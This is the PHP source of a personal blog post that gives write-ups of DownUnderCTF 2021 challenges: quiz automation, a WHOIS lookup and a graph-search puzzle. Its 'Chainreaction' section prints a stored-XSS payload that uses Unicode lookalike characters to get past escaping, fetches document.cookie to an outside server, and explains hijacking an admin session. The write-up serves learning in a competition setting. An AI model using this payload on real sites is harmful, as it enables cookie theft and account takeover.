<?php
header('link: '
    . 'rel="preload"; as="image"; type="image/avif" href="https://jfhr.me/your-browser-supports.avif",'
    . 'rel="preload"; as="image"; type="image/webp" href="https://jfhr.me/your-browser-supports.webp",'
    . 'rel="preload"; as="image"; type="image/jpeg" href="https://jfhr.me/your-browser-supports.png"'
);

$title = 'The Down Under CTF 2021';
$description = "<p>I was spontaneously invited to play on the DownUnderCTF 2021 by ps1ttacus.</p>
<p>The most important thing I learned: CTF's are fun! I'm glad I participated and want to say a big thank you to the organizers. In this post I share writeups of the challenges I solved.</p>";
$date = '2021-09-26';

require_once __DIR__ . '/../.highlight.php';
require_once __DIR__ . '/../.begin.php';
?>

<article>
    <h1>The Down Under CTF 2021</h1><p>Yesterday, I played in my very first organized Capture-the-Flag game, the <a href="https://downunderctf.com/">DownUnderCTF 2021</a>. I was spontaneously invited on a team by ps1ttacus (btw, read <a href="https://ps1ttacus.de">his blog</a>!).</p><p>The most important thing I learned: CTF's are fun! I'm glad I participated and want to say a big thank you to the organizers.</p><p>Below I'll share writeups of the challenges I solved:</p><h2>Discord (100 points)</h2><p>This one was simple, the flag was posted in the DownUnderCTF discord server in the #request-support channel.</p><h2>General skills quiz (100 points)</h2><p>The quiz was a network application that you could talk to via netcat:</p><p><?php echo highlight('plaintext', "> nc pwn-2021.duc.tf
Welcome to the DUCTF Classroom! Cyber School is now in session!
Press enter when you are ready to start your 30 seconds timer for the quiz...
>
Woops the time is always ticking...
Answer this maths question: 1+1=?
> 2
"); ?></p><p>After that, the questions became slightly more difficult - things like converting from hex to decimal, encoding text, etc. Given the time limit, it became clear that I had to automate the process. I used a google colab workbook to write some python code that took the quiz over the network. Here's a snippet demonstrating how it worked:</p><?php echo highlight('python', "def create_answer(q):
  q = q.strip('\\n')
  if 'Press enter when you are ready to start your 30 seconds timer for the quiz...' in q:
    return '\\n'
  if 'Answer this maths question: 1+1=?' in q:
    return '2\\n'
  arg = q.split(' ')[-1]
  if 'Decode this hex string and provide me the original number (base 10):' in q:
    return str(int(arg, base=16)) + '\\n'
  if 'Decode this hex string and provide me the original ASCII letter:' in q:
    return chr(int(arg, base=16)) + '\\n'
  # more question formats omitted for brevity...

sock = socket.socket()
sock.connect(('pwn-2021.duc.tf', 31905))
while True:
  data = sock.recv(2048)
  if not data:
    break
  q = data.decode()
  print('>>> ' + q)
  a = create_answer(q)
  print('<<< ' + a)
  sock.sendall(a.encode())
"); ?>
    Then I just had to sit back and watch my script take the quiz for me :)</p><p>You can view the full code <a href="https://colab.research.google.com/drive/1r3okH7YCfF_gN2lgJLPfZw0HmPXLq3Ee?usp=sharing" target="_blank">in the notebook</a>.</p><h2>Chainreaction (100 points)</h2><p>I liked this one in particular. The goal was to get into the protected admin page of a web forum. </p><p>First, I registered a normal account. I wasn't allowed to visit the admin page, but I could visit the developer chat page. On there, the devs were talking about bugs in the forum software. Someone mentioned that on the profile page, they were escaping HTML and then normalizing it. That was the deciding clue.</p><p>On the profile page, you could write some text in the "about me" section. That text was escaped to prevent XSS attacks - so if you entered, say <code>"&lt;script&gt;alert('<3');&lt;/script&gt;"</code>, it wouldn't run that code. But, like mentioned in the devchat, the escaping happened <i>before</i> the unicode normalization. That meant that I could enter a string like <code>"﹤ˢcrⁱpt﹥fetch("https://jfhr.de/"+document.cookie)﹤/ˢcrⁱpt﹥"</code>, with the <i>s</i> and <i>t</i> replaced by a similar unicode character. The HTML escaping wouldn't recognize that as a script tag, so it wouldn't get escaped. But then the normalizer kicked in, and it replaced those special unicode characters with their normal ASCII equivalent. So in the end, the string <code>"&lt;script&gt;fetch("https://jfhr.de/"+document.cookie)&lt;/script&gt;"</code> would get inserted into the page. Now, when loading the profile page, it would send a request to my server and I could see the cookies in my server logs.</p><p>The last step was to abuse the "Report error" button. That sent a link to my profile page to an admin, who then opened it. Now, the admin's cookies were in my server logs! All I had to do was set that cookie in my own browser, and I could visit the admin page. There I found the flag.</p><h2>Who goes there (100 points)</h2><p>Another simple one - here, you just had to look up the WHOIS information for a domain name and find the phone number of the registered owner.</p><h2>Flying Spaghetti Monster (491 points)</h2><p>This was by far the most challenging one I solved - but it was worth it! This was another network quiz app, like the general skills quiz, but with a specific type of question. As part of the challenge, you were given a text file describing a directed graph with 10000 edges. Each edge had two pieces of data associated with it: An ASCII character, and a polynomial of the form <code>a*x+b</code>. For each question, you were given the number of a vertex in the graph, and another polynomial. The goal was to find the unique path in the graph that </p><ol><li>ends at the given vertex and</li><li>produces the given polynomial when you combine the polynomials of its edges in order.</li></ol><p>By "combine polynomials" I mean simply using the result of the first polynomial as input for the second one. I.e. for two polynomials <code>a1*x+b1</code> and <code>a2*x+b2</code>, their combination would be <code>a1*(a2*x+b2)+b1</code>.</p><p>The answer was the string formed by taking all the characters from the edges of that path in order.</p><p>Here's a simple example:</p><p>The first question was <code>1042029647*x + 41704533 -> 28</code>. So we had to find a path that ends in 28 and has a combined polynomial of <code>1042029647*x + 41704533</code>.</p><p>The correct path had only two edges:</p><ul><li><code>25->25   52   21467*x + 859</code></li><li><code>25->28   50   48541*x + 7814</code></li></ul><p>First we go from vertex <code>25</code> to <code>25</code>. Our starting polynomial is <code>21467*x + 859</code>. Then we go to <code>28</code>. The resulting polynomial is <code>48541*(21467*x + 859) + 7814 = 1042029647 * x + 41704533</code>, exactly what the question asked for! To get the answer, we take the character for each edge, given as an ASCII number. Here: <code>52</code> and <code>50</code>, which corresponds to <code>"4"</code> and <code>"2"</code>, so the answer is <code>"42"</code>.</p><p>This first question was rather straightforward, but the numbers quickly got <i>much</i> larger, and time limits were also introduced. Clearly, this process had to be automated. I decided to use C# in this case, since I'm more comfortable working with algorithms in it compared to python.</p><p>To find the solution, I did a depth-first search starting from the final edge (that was given in the question), until I found a solution that exactly matched the given polynomial. All the polynomial coefficients were integers, which meant that I could check for divisibility and immediately discard any potential edges where it wasn't given (otherwise, the code would have been far too slow). Because the numbers were so large, I used C#'s built-in <code>BigInteger</code> data type, which can store arbitrarily large numbers.</p><p>The full code can be found <a href="https://gist.github.com/jfhr/0b175b03017c1c89be41f8611d5c3191" target="_blank">on GitHub</a>.</p><p>And that's it! I tried a few more web challenges but didn't finish any in time. But that's okay, because I learned a lot within just a few hours by playing, and I definitely want to do more in the future. Btw, if you know any good CTFs, feel free to <a href="mailto:me@jfhr.de?subject=CTF">let me know</a>!</p>
</article>

<?php
require_once __DIR__ . '/../.end.php';
